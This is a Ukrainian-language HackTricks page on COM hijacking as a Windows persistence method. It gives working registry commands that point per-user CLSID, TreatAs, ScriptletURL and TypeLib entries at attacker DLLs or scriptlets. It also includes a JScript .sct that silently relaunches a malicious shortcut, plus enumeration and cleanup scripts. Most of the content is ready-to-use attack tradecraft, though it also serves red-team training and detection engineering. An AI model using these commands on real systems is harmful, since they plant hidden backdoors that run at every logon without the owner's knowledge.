# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Пошук неіснуючих COM компонентів

Оскільки значення HKCU можуть бути змінені користувачами, **COM Hijacking** може використовуватися як **механізм персистентності**. Використовуючи `procmon`, легко знайти запити до реєстру COM, які ще не існують і можуть бути створені зловмисником. Класичні фільтри:

- **RegOpenKey** операції.
- де _Result_ — **NAME NOT FOUND**.
- і _Path_ закінчується на **InprocServer32**.

Корисні варіації при пошуку:

- Також звертайте увагу на відсутні ключі **`LocalServer32`**. Деякі COM-класи — це сервери, що працюють поза процесом (out-of-process), і вони запустять EXE, підконтрольний зловмиснику, замість DLL.
- Шукайте також операції реєстру **`TreatAs`** і **`ScriptletURL`**, окрім `InprocServer32`. Останні матеріали з виявлення і розбору шкідливого ПЗ відзначають їх, оскільки вони набагато рідше зустрічаються, ніж звичайні реєстрації COM і тому мають високу інформативність.
- Скопіюйте легітимний **`ThreadingModel`** з оригінального `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` при клонуванні запису до HKCU. Використання неправильної моделі часто ламає активацію і робить хіджак шумним.
- На 64-бітних системах перевіряйте як 64-бітний, так і 32-бітний вигляди (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` та `HKLM\Software\Classes\WOW6432Node`), оскільки 32-бітні додатки можуть звертатися до іншої реєстрації COM.

Після того, як ви визначили, який неіснуючий COM імітувати, виконайте наступні команди. _Будьте обережні, якщо ви вирішите імітувати COM, який завантажується кожні кілька секунд — це може бути надмірним._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Компоненти COM Task Scheduler, які можна перехопити

Windows Tasks використовують Custom Triggers для виклику COM objects і, оскільки вони виконуються через Task Scheduler, легше передбачити, коли вони будуть спрацьовувати.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Переглянувши вивід, можна вибрати той, що, наприклад, буде виконуватися **кожного разу при вході користувача в систему**.

Тепер, шукаючи CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** у **HKEY\CLASSES\ROOT\CLSID** та в HKLM і HKCU, зазвичай ви виявите, що цього значення немає в HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Потім ви можете просто створити запис у HKCU, і щоразу при вході користувача ваш backdoor буде запущений.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` дозволяє одному CLSID емулюватися іншим. З атакуючої точки зору це означає, що ви можете залишити оригінальний CLSID незмінним, створити другий CLSID на рівні користувача, який вказує на `scrobj.dll`, а потім перенаправити реальний COM-об'єкт на шкідливий за допомогою `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Це корисно коли:

- цільовий додаток вже інстанціює стабільний CLSID під час входу або при запуску програми
- ви хочете перенаправлення тільки через реєстр замість заміни оригінального `InprocServer32`
- ви хочете виконати локальний або віддалений `.sct` scriptlet через значення `ScriptletURL`

Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Примітки:

- `scrobj.dll` зчитує значення `ScriptletURL` і виконує вказаний `.sct`, тож ви можете зберігати payload як локальний файл або підвантажувати його віддалено по HTTP/HTTPS.
- `TreatAs` особливо зручний, коли початкова реєстрація COM повна і стабільна в HKLM, оскільки потрібно лише невелике перенаправлення на рівні користувача замість дзеркалення всього дерева.
- Щоб перевірити без очікування природного тригера, ви можете вручну створити екземпляр фейкового ProgID/CLSID за допомогою `rundll32.exe -sta <ProgID-or-CLSID>`, якщо цільовий клас підтримує STA activation.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) визначають інтерфейси COM і завантажуються через `LoadTypeLib()`. Коли COM-сервер інстанціюється, ОС також може завантажити пов'язаний TypeLib, звернувшись до ключів реєстру під `HKCR\TypeLib\{LIBID}`. Якщо шлях TypeLib замінити на **moniker**, напр., `script:C:\...\evil.sct`, Windows виконає scriptlet при вирішенні TypeLib — що дає stealthy persistence, яка спрацьовує, коли зачіпаються звичайні компоненти.

Це спостерігалося проти Microsoft Web Browser control (який часто завантажується Internet Explorer, додатками з вбудованим WebBrowser і навіть `explorer.exe`).

### Кроки (PowerShell)

1) Ідентифікуйте TypeLib (LIBID), який використовується часто викликаним CLSID. Приклад CLSID, який часто зловживають malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}`
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Вкажіть per-user TypeLib path на локальний scriptlet, використовуючи монікер `script:` (права адміністратора не потрібні):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Помістіть мінімальний JScript `.sct`, який перезапускає ваш primary payload (наприклад `.lnk`, що використовувався в початковому ланцюжку):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Спрацьовування – відкриття IE, програми, яка вбудовує WebBrowser control, або навіть звичайна активність Explorer завантажить TypeLib і виконає scriptlet, повторно активуючи ваш ланцюжок при logon/reboot.

Очищення
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Примітки
- Ви можете застосувати ту саму логіку до інших часто використовуваних COM компонентів; завжди спочатку визначайте реальний `LIBID` з `HKCR\CLSID\{CLSID}\TypeLib`.
- На 64-розрядних системах ви також можете заповнити підключ `win64` для 64-розрядних споживачів.

## Посилання

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
